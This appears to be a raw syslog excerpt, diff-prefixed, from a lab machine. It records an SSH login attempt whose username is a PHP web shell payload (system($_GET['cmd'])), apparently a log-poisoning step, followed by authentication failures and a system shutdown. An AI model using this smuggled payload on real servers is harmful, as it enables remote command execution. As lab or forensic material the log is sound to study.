+Dec 14 01:39:04 localhost audit: CRYPTO_KEY_USER pid=1906 uid=0 auid=4294967295 ses=4294967295 msg='op=destroy kind=server fp=SHA256:61:44:c9:0d:fa:3e:40:e9:bb:ee:66:0b:27:05:91:17:1a:53:f0:a9:60:72:c9:4f:8d:55:cd:d3:f7:2e:0d:4c direction=? spid=1906 suid=0  exe="/usr/sbin/sshd" hostname=? addr=192.168.56.1 terminal=? res=success'
+Dec 14 01:39:04 localhost audit: CRYPTO_SESSION pid=1905 uid=0 auid=4294967295 ses=4294967295 msg='op=start direction=from-server cipher=chacha20-poly1305@openssh.com ksize=512 mac= pfs=curve25519-sha256@libssh.org spid=1906 suid=74 rport=46636 laddr=192.168.56.130 lport=22  exe="/usr/sbin/sshd" hostname=? addr=192.168.56.1 terminal=? res=success'
+Dec 14 01:39:04 localhost audit: CRYPTO_SESSION pid=1905 uid=0 auid=4294967295 ses=4294967295 msg='op=start direction=from-client cipher=chacha20-poly1305@openssh.com ksize=512 mac= pfs=curve25519-sha256@libssh.org spid=1906 suid=74 rport=46636 laddr=192.168.56.130 lport=22  exe="/usr/sbin/sshd" hostname=? addr=192.168.56.1 terminal=? res=success'
+Dec 14 01:39:06 localhost sshd[1905]: Invalid user <?php system($_GET["cmd"]);?> from 192.168.56.1
+Dec 14 01:39:06 localhost sshd[1905]: input_userauth_request: invalid user <?php system($_GET["cmd"]);?> [preauth]
+Dec 14 01:39:08 localhost sshd[1905]: pam_unix(sshd:auth): check pass; user unknown
+Dec 14 01:39:08 localhost sshd[1905]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.56.1
+Dec 14 01:39:08 localhost audit: USER_AUTH pid=1905 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:authentication grantors=? acct="?" exe="/usr/sbin/sshd" hostname=192.168.56.1 addr=192.168.56.1 terminal=ssh res=failed'
+Dec 14 01:39:10 localhost sshd[1905]: Failed password for invalid user <?php system($_GET["cmd"]);?> from 192.168.56.1 port 46636 ssh2
+Dec 14 01:39:10 localhost audit: USER_AUTH pid=1905 uid=0 auid=4294967295 ses=4294967295 msg='op=password acct="(unknown)" exe="/usr/sbin/sshd" hostname=? addr=192.168.56.1 terminal=ssh res=failed'
+Dec 14 01:39:10 localhost sshd[1905]: error: maximum authentication attempts exceeded for invalid user <?php system($_GET["cmd"]);?> from 192.168.56.1 port 46636 ssh2 [preauth]
+Dec 14 01:39:10 localhost sshd[1905]: Disconnecting: Too many authentication failures [preauth]
+Dec 14 01:39:10 localhost audit: USER_AUTH pid=1905 uid=0 auid=4294967295 ses=4294967295 msg='op=maxtries exceeded acct="(unknown)" exe="/usr/sbin/sshd" hostname=? addr=192.168.56.1 terminal=ssh res=failed'
+Dec 14 01:39:10 localhost audit: CRYPTO_KEY_USER pid=1905 uid=0 auid=4294967295 ses=4294967295 msg='op=destroy kind=session fp=? direction=both spid=1906 suid=74 rport=46636 laddr=192.168.56.130 lport=22  exe="/usr/sbin/sshd" hostname=? addr=192.168.56.1 terminal=? res=success'
+Dec 14 01:39:10 localhost audit: CRYPTO_KEY_USER pid=1905 uid=0 auid=4294967295 ses=4294967295 msg='op=destroy kind=server fp=SHA256:61:44:c9:0d:fa:3e:40:e9:bb:ee:66:0b:27:05:91:17:1a:53:f0:a9:60:72:c9:4f:8d:55:cd:d3:f7:2e:0d:4c direction=? spid=1906 suid=74  exe="/usr/sbin/sshd" hostname=? addr=192.168.56.1 terminal=? res=success'
+Dec 14 01:39:10 localhost audit: CRYPTO_KEY_USER pid=1905 uid=0 auid=4294967295 ses=4294967295 msg='op=destroy kind=server fp=SHA256:55:7e:f1:22:af:6d:02:f2:79:13:e3:cf:60:6d:c3:f7:4b:aa:69:49:aa:45:64:c6:6e:34:d3:99:93:e0:b9:ac direction=? spid=1905 suid=0  exe="/usr/sbin/sshd" hostname=? addr=192.168.56.1 terminal=? res=success'
+Dec 14 01:39:10 localhost audit: CRYPTO_KEY_USER pid=1905 uid=0 auid=4294967295 ses=4294967295 msg='op=destroy kind=server fp=SHA256:85:01:8a:71:7c:fb:c5:51:b5:b1:86:28:d3:e0:ab:1f:dd:1f:39:2f:25:95:c4:57:4d:dc:ed:c2:1c:ed:a5:47 direction=? spid=1905 suid=0  exe="/usr/sbin/sshd" hostname=? addr=192.168.56.1 terminal=? res=success'
+Dec 14 01:39:10 localhost audit: CRYPTO_KEY_USER pid=1905 uid=0 auid=4294967295 ses=4294967295 msg='op=destroy kind=server fp=SHA256:61:44:c9:0d:fa:3e:40:e9:bb:ee:66:0b:27:05:91:17:1a:53:f0:a9:60:72:c9:4f:8d:55:cd:d3:f7:2e:0d:4c direction=? spid=1905 suid=0  exe="/usr/sbin/sshd" hostname=? addr=192.168.56.1 terminal=? res=success'
+Dec 14 01:39:10 localhost audit: USER_LOGIN pid=1905 uid=0 auid=4294967295 ses=4294967295 msg='op=login acct="(unknown)" exe="/usr/sbin/sshd" hostname=? addr=192.168.56.1 terminal=ssh res=failed'
+Dec 14 01:39:10 localhost systemd: proc-sys-fs-binfmt_misc.automount: Got automount request for /proc/sys/fs/binfmt_misc, triggered by 1921 (find)
+Dec 14 01:39:10 localhost systemd: Mounting Arbitrary Executable File Formats File System...
+Dec 14 01:39:10 localhost systemd: Mounted Arbitrary Executable File Formats File System.
+Dec 14 01:39:23 localhost systemd-logind: Power key pressed.
+Dec 14 01:39:23 localhost systemd-logind: Powering Off...
+Dec 14 01:39:23 localhost systemd-logind: System is powering down.
+Dec 14 01:39:23 localhost systemd: Stopped target Multi-User System.
+Dec 14 01:39:23 localhost systemd: Stopping Multi-User System.
+Dec 14 01:39:23 localhost systemd: Stopping OpenSSH server daemon...
+Dec 14 01:39:23 localhost systemd: Stopping Machine Check Exception Logging Daemon...
+Dec 14 01:39:23 localhost systemd: Stopping Login Service...
+Dec 14 01:39:23 localhost systemd: Deactivating swap /dev/mapper/fedora-swap...
+Dec 14 01:39:23 localhost systemd: Stopping Hardware RNG Entropy Gatherer Daemon...
+Dec 14 01:39:23 localhost sshd[686]: Received signal 15; terminating.
+Dec 14 01:39:23 localhost audit: CRYPTO_KEY_USER pid=686 uid=0 auid=4294967295 ses=4294967295 msg='op=destroy kind=server fp=SHA256:55:7e:f1:22:af:6d:02:f2:79:13:e3:cf:60:6d:c3:f7:4b:aa:69:49:aa:45:64:c6:6e:34:d3:99:93:e0:b9:ac direction=? spid=686 suid=0  exe="/usr/sbin/sshd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:39:23 localhost audit: CRYPTO_KEY_USER pid=686 uid=0 auid=4294967295 ses=4294967295 msg='op=destroy kind=server fp=SHA256:85:01:8a:71:7c:fb:c5:51:b5:b1:86:28:d3:e0:ab:1f:dd:1f:39:2f:25:95:c4:57:4d:dc:ed:c2:1c:ed:a5:47 direction=? spid=686 suid=0  exe="/usr/sbin/sshd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:39:23 localhost audit: CRYPTO_KEY_USER pid=686 uid=0 auid=4294967295 ses=4294967295 msg='op=destroy kind=server fp=SHA256:61:44:c9:0d:fa:3e:40:e9:bb:ee:66:0b:27:05:91:17:1a:53:f0:a9:60:72:c9:4f:8d:55:cd:d3:f7:2e:0d:4c direction=? spid=686 suid=0  exe="/usr/sbin/sshd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:39:23 localhost systemd: Stopping The Apache HTTP Server...
+Dec 14 01:39:23 localhost systemd: Removed slice system-systemd\x2dfsck.slice.
+Dec 14 01:39:23 localhost systemd: Stopping system-systemd\x2dfsck.slice.
+Dec 14 01:39:23 localhost systemd: Stopping MariaDB 10.0 database server...
+Dec 14 01:39:23 localhost NetworkManager[674]: <info>  caught SIGTERM, shutting down normally.
+Dec 14 01:39:23 localhost NetworkManager[674]: <info>  exiting (success)
+Dec 14 01:39:23 localhost rsyslogd: [origin software="rsyslogd" swVersion="8.10.0" x-pid="667" x-info="http://www.rsyslog.com"] exiting on signal 15.
